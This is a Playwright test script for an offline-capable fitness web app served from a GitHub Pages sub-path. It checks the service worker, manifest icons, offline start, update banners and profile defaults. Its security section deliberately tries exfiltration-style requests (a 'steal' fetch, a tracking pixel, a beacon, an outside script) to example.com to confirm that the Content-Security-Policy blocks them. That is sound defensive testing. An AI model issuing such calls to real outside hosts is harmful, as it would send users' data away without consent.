// The app as GitHub Pages serves it: under the /Duo-fit/ sub-path, installed icon, offline, auto-update.
// Idea taken from astra's V2 tests: a local server that mimics the Pages sub-path and can publish a "next" version.
const fs=require("node:fs"),path=require("node:path"),http=require("node:http");
const {devices}=require("playwright");const BR=require("./browser.js");const IOS=require("./iosinit.js");
const root=path.join(__dirname,".."),base="/Duo-fit/",FILES=["index.html","sw.js","manifest.webmanifest","icon-180.png","icon-192.png","icon-512.png"];
const R=[];let fails=0;const ok=(n,c,x='')=>{const l=(c?'PASS ':'FAIL ')+n+(x?' — '+x:'');R.push(l);console.log(l);if(!c)fails++};
const CUR=/const VER="([^"]+)"/.exec(fs.readFileSync(path.join(root,"index.html"),"utf8"))[1];let served=CUR;
(async()=>{
const server=http.createServer((req,res)=>{const route=new URL(req.url,"http://x").pathname,name=route===base?"index.html":route.slice(base.length);
  if(!route.startsWith(base)||!FILES.includes(name)){res.writeHead(404);return res.end()}
  res.setHeader("Content-Type",name.endsWith("html")?"text/html; charset=utf-8":name.endsWith("js")?"application/javascript":name.endsWith("png")?"image/png":"application/manifest+json");
  res.setHeader("Cache-Control","max-age=600"); // like GitHub Pages
  let body=fs.readFileSync(path.join(root,name));if(name==="index.html")body=body.toString().replace(`const VER="${CUR}"`,`const VER="${served}"`);res.end(body)});
await new Promise(r=>server.listen(0,"127.0.0.1",r));const url="http://127.0.0.1:"+server.address().port+base;
const b=await BR.launch(),ctx=await b.newContext({...BR.dev("iPhone SE"),locale:"fr-FR"});await ctx.addInitScript(IOS);
let p=await ctx.newPage();const errs=[];const watch=()=>p.on("pageerror",e=>errs.push(e.message));watch();
await p.goto(url);await p.evaluate(()=>navigator.serviceWorker.ready.then(()=>true));await p.reload();
ok("Service worker controls the page under /Duo-fit/",await p.evaluate(()=>!!navigator.serviceWorker.controller&&navigator.serviceWorker.controller.scriptURL.includes("/Duo-fit/sw.js")));
const man=await p.evaluate(async()=>{const href=document.querySelector("link[rel=manifest]").href,m=await (await fetch(href)).json(),abs=x=>new URL(x,href).href;
  const icons=await Promise.all(m.icons.map(i=>fetch(abs(i.src)).then(r=>r.ok)));const touch=await fetch(document.querySelector("link[rel=apple-touch-icon]").href).then(r=>r.ok);
  return{scope:abs(m.scope),start:abs(m.start_url),icons:icons.every(Boolean),touch}});
ok("Manifest scope and start page stay inside /Duo-fit/, every icon loads (incl. iPhone icon)",man.scope.endsWith("/Duo-fit/")&&man.start.endsWith("/Duo-fit/")&&man.icons&&man.touch,JSON.stringify(man));
await BR.offline(ctx,true);await p.close();p=await ctx.newPage();watch();await p.goto(url);
ok("Cold start with no network (airplane mode)",(await p.textContent("#v")).includes("Commencer la séance"));
await p.goto(url+"?v=old");ok("Offline start also works from an old ?v= link",(await p.textContent("#v")).includes("Commencer la séance"));
await BR.offline(ctx,false);await p.goto(url);
// a workout in progress, then a new version is published
await p.evaluate(()=>{S.d.M.pf.back=false;U.pick="A";go();begin("A");setv(0,0,"w","40");setv(0,0,"r","10");done(0,0)});
served="9999-next";await p.evaluate(()=>upd());await p.waitForSelector("#upb",{state:"visible"});
ok("New version during a workout: banner instead of a forced reload",await p.evaluate(()=>VER!=="9999-next"&&!!cur()));
await p.locator("#upb").evaluate(e=>e.click());await p.waitForFunction(()=>typeof VER!=="undefined"&&VER==="9999-next");
ok("Tapping the banner loads the new version and keeps the workout in progress",await p.evaluate(()=>!!cur()&&cur().ex[0][0].ok===1&&num(cur().ex[0][0].w)===40));
await BR.offline(ctx,true);await p.reload();
ok("Offline right after the update: newest version and the workout are still there",await p.evaluate(()=>VER==="9999-next"&&!!cur()));
await BR.offline(ctx,false);await p.evaluate(()=>{writeSessionEnd(null);clearView();go()});
served="9999-next2";await p.evaluate(()=>upd());await p.waitForFunction(()=>typeof VER!=="undefined"&&VER==="9999-next2",null,{timeout:8000});
ok("No workout in progress: the update applies by itself",await p.evaluate(()=>VER==="9999-next2"));
// ===== security: the page may only talk to its own address; no one's profile values are prefilled =====
const sec=await p.evaluate(async()=>{window.__cspTest=true;const blocked=[];const h=e=>blocked.push(e.violatedDirective||e.effectiveDirective);document.addEventListener("securitypolicyviolation",h);
  let fetchOk=true;try{await fetch("https://example.com/steal?x=1")}catch{fetchOk=false}
  const img=new Image();img.src="https://example.com/pixel.gif";try{navigator.sendBeacon("https://example.com/b","x")}catch{}
  const sc=document.createElement("script");sc.src="https://example.com/x.js";document.head.appendChild(sc);
  const has=d=>blocked.some(x=>x.startsWith(d));for(let i=0;i<300&&!(has("connect-src")&&has("img-src")&&has("script-src"));i++)await new Promise(r=>requestAnimationFrame(r));
  for(let i=0;i<10;i++)await new Promise(r=>requestAnimationFrame(r));document.removeEventListener("securitypolicyviolation",h);window.__cspTest=false;
  const own=await fetch(location.pathname+"?nocache=1").then(r=>r.ok).catch(()=>false);
  return{fetchOk,blocked:[...new Set(blocked)].sort(),own,meta:!!document.querySelector('meta[http-equiv="Content-Security-Policy"]')}});
ok("Security policy: sending data to another site is blocked (fetch, image, outside script)",sec.meta&&!sec.fetchOk&&["connect-src","img-src","script-src"].every(d=>sec.blocked.some(x=>x.startsWith(d))),JSON.stringify(sec));
ok("…while the app's own update check still reaches its address",sec.own);
const ctxN=await b.newContext({...BR.dev("iPhone SE"),locale:"fr-FR"});await ctxN.addInitScript(IOS);const q=await ctxN.newPage();await q.goto(url);
const fresh=await q.evaluate(()=>({m:[S.d.M.pf.age,S.d.M.pf.h,S.d.M.pf.w],f:[S.d.F.pf.age,S.d.F.pf.h,S.d.F.pf.w],txt:document.getElementById("v").textContent,nd:window.__nd.length}));
ok("A new phone gets no one's age, height or weight prefilled and is asked to complete the profile",fresh.m.every(x=>x==null)&&fresh.f.every(x=>x==null)&&fresh.txt.includes("Complète ton profil")&&fresh.nd===0,JSON.stringify({m:fresh.m,f:fresh.f}));
await ctxN.close();
ok("No native dialogs or page errors",!errs.length&&await p.evaluate(()=>(window.__nd||[]).length===0),errs.join(" | "));
console.log(`\n${R.length-fails}/${R.length} passed`);await b.close();server.close();process.exit(fails?1:0)})().catch(e=>{console.log("CRASH",e.message);process.exit(2)});
